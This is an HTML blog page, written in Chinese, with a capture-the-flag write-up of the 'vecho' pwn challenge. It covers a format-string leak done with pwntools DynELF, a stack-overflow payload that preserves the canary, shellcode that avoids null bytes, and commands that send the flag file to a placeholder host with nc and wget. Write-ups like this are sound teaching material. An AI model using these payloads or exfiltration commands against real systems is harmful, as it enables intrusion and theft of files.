@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>CSP CTF pwn 40 - vecho | Work</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="題目這題是一個 socket server，連線進來 frok handler 不斷 echo input 回去 echo 的東西是 input sprintf 出來的 有 fmt 洞，但擋掉了 ‘n’ 也就是不給寫入 解這一題走了許多彎路，花了超久，但也因此用了一些沒用過的 pwntools 工具： DynELF handler function: ![](http://user-image.l">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSP CTF pwn 40 - vecho">
+<meta property="og:url" content="http://yoursite.com/2016/02/01/CSP-CTF-pwn-40-vecho/index.html">
+<meta property="og:site_name" content="Work">
+<meta property="og:description" content="題目這題是一個 socket server，連線進來 frok handler 不斷 echo input 回去 echo 的東西是 input sprintf 出來的 有 fmt 洞，但擋掉了 ‘n’ 也就是不給寫入 解這一題走了許多彎路，花了超久，但也因此用了一些沒用過的 pwntools 工具： DynELF handler function: ![](http://user-image.l">
+<meta property="og:locale" content="zh">
+<meta property="og:updated_time" content="2019-06-22T02:12:31.940Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CSP CTF pwn 40 - vecho">
+<meta name="twitter:description" content="題目這題是一個 socket server，連線進來 frok handler 不斷 echo input 回去 echo 的東西是 input sprintf 出來的 有 fmt 洞，但擋掉了 ‘n’ 也就是不給寫入 解這一題走了許多彎路，花了超久，但也因此用了一些沒用過的 pwntools 工具： DynELF handler function: ![](http://user-image.l">
+  
+    <link rel="alternate" href="/atom.xml" title="Work" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Work</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-CSP-CTF-pwn-40-vecho" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/02/01/CSP-CTF-pwn-40-vecho/" class="article-date">
+  <time datetime="2016-02-01T11:47:17.000Z" itemprop="datePublished">2016-02-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      CSP CTF pwn 40 - vecho
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p>這題是一個 socket server，連線進來 frok handler 不斷 echo input 回去</p>
+<p>echo 的東西是 input sprintf 出來的 有 fmt 洞，但擋掉了 ‘n’ 也就是不給寫入</p>
+<p>解這一題走了許多彎路，花了超久，但也因此用了一些沒用過的 pwntools 工具： DynELF</p>
+<p>handler function:</p>
+<figure>![](http://user-image.logdown.io/user/14835/blog/14031/post/379583/uWMiX4rVSymDLciIOvoe_vecho2.jpg)</figure>
+
+<p>echo function:</p>
+<figure>![](http://user-image.logdown.io/user/14835/blog/14031/post/379583/LjQXY06QSuuNho6K3GwY_vecho1.jpg)</figure>
+
+<h2 id="過程"><a href="#過程" class="headerlink" title="過程"></a>過程</h2><h3 id="DynELF"><a href="#DynELF" class="headerlink" title="DynELF"></a>DynELF</h3><p>依照 hint, DEP 沒開，還有 overflow 提示，但因為 ADL 那一題的慣性 讓我一直想 hiject strcmp, 所以為了拿 libc 地址，開始研究 DynELF</p>
+<p>用法大概如下，其中 ret_of_main 為某一在 libc 中的地址，我是從 stack 中拿 retrutn address of main</p>
+<p>DynELF 會先往上找出 loading base, 接著幫你分辦一下 libc ver 然後找出 symbol 地址</p>
+<figure class="figure-code code"><div class="highlight"><pre>d = DynELF(leak, ret_of_main)
+system_adr = d.lookup('system', 'libc')
+</pre></div>
+</figure>
+
+<p>leak 為一個 洩漏任意地址 callback function 因為 fmt buf 在 stack 上，可以拿來利用</p>
+<p>要注意的是因為 sprintf 過去的 buf 有可能會 overflow 導至 handler 壞掉， DynELF 卡住 所以要用%xs控制一下讀出的 mem 長度，還有就是讀出來沒東西(‘\x00’)的情況也要處理到。</p>
+<figure class="figure-code code"><div class="highlight"><pre>payload = "%{}$.8sxxxx\x00".format(ped+3)+p32(adr)
+</pre></div>
+</figure>
+
+<p>完整的 leak function:</p>
+<figure class="figure-code code"><div class="highlight"><pre>def leak(adr):
+    if adr &lt; 0x08048000:
+        return ''
+    global ped, r # pedding in stack point to head of input buffer, and r for remote conn
+    # big problem is buffer of sprintf isn't long enought, %s may too long and will crash handler
+    # also, sprintf eat input str end of \x00, but address of page align always contains \x00, 
+    # to avoid cutting of payload, just put address after fmt payload, recv will still recv to buffer(in stack)
+    payload = "%{}$.8sxxxx\x00".format(ped+3)+p32(adr)
+    r.send(payload)
+    time.sleep(0.02)
+    r.recvuntil('Type string to echo back: ')
+
+<pre><code>s = r.recvuntil(&apos;xx&apos;)
+if len(s) == 8: # recv did not contain any mem data
+    return &apos;\x00&apos;
+rtn = (s[6:s.index(&apos;xx&apos;)]) # ret of echo is str in format &apos;Echo: &apos; + xxx
+return rtn</code></pre><p></p></pre></div><p></p>
+</figure>
+
+<h3 id="Overflow"><a href="#Overflow" class="headerlink" title="Overflow"></a>Overflow</h3><h4 id="First-try"><a href="#First-try" class="headerlink" title="First try"></a>First try</h4><p>YA! 拿到 system address 了。。。 好像不能做啥</p>
+<p>GOT Hiject?</p>
+<p>%n 被 filte 掉了無法寫入</p>
+<p>ret to libc?</p>
+<p>嗯。。來試試看，首先 echo 內的 recv buf 並沒有 overflow 的可能, recv 的大沒沒有比 buf 大</p>
+<figure class="figure-code code"><div class="highlight"><pre>char s[64];
+。。。
+if ( recv(fd, s, 63u, 0) )
+</pre></div>
+</figure>
+
+<p>回頭看一下 sprintf 去的 buf, 是在 echoServer 的 stack frame 中，大小 128 經過 sprintf 可用 $nc 來 overflow</p>
+<p>stack 長這様</p>
+<figure>![](http://user-image.logdown.io/user/14835/blog/14031/post/379583/z06KrtnT4CwSbjJn0qmU_IMG_20151221_112710.jpg)</figure>
+
+<p>要蓋的是 echoServer 的 return address payload 可以長這様</p>
+<figure class="figure-code code"><div class="highlight"><pre>payload = pa_n_c(128-6)+'g'+s_canary[1:]+pa_n_c(0x18+4)+p32(system_adr)+'aaaa'+p32(p_buf)
+# aaaa for fake ret of system
+send..
+payload = pa_n_c(128-6) # overwrite 'g' to \x00
+send..
+</pre></div>
+</figure>
+
+<p>但馬上遇到問題，sock fd 被蓋到 無法再收發 data</p>
+<p>如果要把 ‘aaaa’ 改成 fd 又會因為 fd 太小 p32 中有 \x00 導致後面被截斷</p>
+<p>這邊卡了許久~</p>
+<h4 id="Try-again"><a href="#Try-again" class="headerlink" title="Try again"></a>Try again</h4><p>後來突然想到 hint DEP 沒開，那我還不 ret to stack 跑我精心制做的 asm code, 於是我好興奮地用了 pwntools 的 asm</p>
+<figure class="figure-code code"><div class="highlight"><pre>asmc = "push {}\n"
+asmc += "push {}\n"
+asmc += "push {}\n"
+asmc += "ret\n"
+asmc = asm.format(poi_buf, fake_ret, system_addr)
+
+<p>asmc = asm(asmc)<br></p></pre></div><p></p>
+</figure>
+
+<p>接著是一段漫長的 debug 時光，我用 gdb set follow-fork-mode child 看了許多遍，都正確 ret to system, 同時 esp+4 也 point 到 我給的 cmd, 至少 x/s 出來有</p>
+<p>但 cmd 卻始終沒有跑起來 甚至 system 都 return 回 fake_ret 了</p>
+<p>想了好久才開始猜是不是 system 把我的 cmd 吃了。。。 嘗試先 add esp</p>
+<p>但直接 add esp, 0xN 的 machine code 是把 0xN 以 little endian, dwork 方式包在 machine code 中</p>
+<p>只好繞來繞去 避開 machine code 中出現 \x00</p>
+<figure class="figure-code code"><div class="highlight"><pre>inc ecx
+inc ecx
+inc ecx
+imul ecx, ecx
+imul ecx, ecx
+add esp, ecx
+</pre></div>
+</figure>
+
+<p>然後就可以塞 cmd 了 一開始用 touch /tmp/xxx 可以 work 後馬上嘗試用 cat /home/ctf/flag | nc x.x.x.x y</p>
+<p>想當然爾不能動… 最有問題的是 nc 中有 n …….</p>
+<p>還有就是我一開始串的方法是 </p>
+<figure class="figure-code code"><div class="highlight"><pre>cmd = code+"cat ...."
+</pre></div>
+</figure>
+
+<p>也就是 machine code 長度 + 指令長度 不能超過 63(echo 的 buf)</p>
+<p>但光是 ip 就至少 15 bytes, path 就 14 bytes, 還要預留 exit 的空間等等 總之就是不夠</p>
+<p>所以分兩次塞 先把指令塞到 echoServer 128 buffer 後半部 (%xc+cmd)</p>
+<p>再塞 machine code</p>
+<p>指令部分改成 wget x.x.x.x:y/?<code>cat /home/ctf/flag</code></p>
+<p>接著又因為 stack 拉不夠遠又把指令吃掉撞牆了一陣子 後來在加一次 add esp, ecx 後終於成功了</p>
+<h2 id="大大的解法"><a href="#大大的解法" class="headerlink" title="大大的解法"></a>大大的解法</h2><p>根據 meh 大大表示 asm code 跑 dup2(fd, 0) dup2(fd, 1) 就好啦</p>
+<p>。。。嗯 原來有 dup2 可以用</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2016/02/01/CSP-CTF-pwn-40-vecho/" data-id="cjx6w1jrz0003l6vq92lvxitt" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2016/03/27/ADL-CTF-2015-SimpleEcho2/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          ADL CTF 2015 - SimpleEcho2
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2016/02/01/Puzzle-Dragon-Helper/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Puzzle &amp; Dragon Helper</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/02/">February 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">December 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">October 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">September 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/05/">May 2015</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2019/06/22/Blog-Migrated/">搬家</a>
+          </li>
+        
+          <li>
+            <a href="/2016/07/14/AIS3-2016-pre-exam/">AIS3 2016 pre-exam</a>
+          </li>
+        
+          <li>
+            <a href="/2016/06/12/DEFCON-Qualifier-Reverse-amadhj-by-angr/">DEFCON Qualifier Reverse amadhj by angr</a>
+          </li>
+        
+          <li>
+            <a href="/2016/03/27/ADL-CTF-2015-SimpleEcho2/">ADL CTF 2015 - SimpleEcho2</a>
+          </li>
+        
+          <li>
+            <a href="/2016/02/01/CSP-CTF-pwn-40-vecho/">CSP CTF pwn 40 - vecho</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 Wayne Lee<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
